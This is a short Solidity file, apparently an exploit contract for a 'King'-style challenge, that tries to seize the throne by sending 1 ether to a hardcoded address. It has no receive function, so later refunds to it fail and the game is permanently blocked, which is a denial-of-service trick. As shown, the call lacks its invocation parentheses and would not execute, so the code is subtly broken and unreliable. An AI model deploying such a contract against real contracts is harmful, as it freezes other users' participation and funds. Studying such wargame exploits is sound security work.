// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface King {}

contract HackKing {
    constructor() public payable {}

    function takeTheThrone() public {
        address(0x293596C669ef6b2aD3bAa28d0f70Ce9105115882).call{
            value: 1 ether
        };
    }

    //No receive function; cannot accept the transfer to leave the throne.
}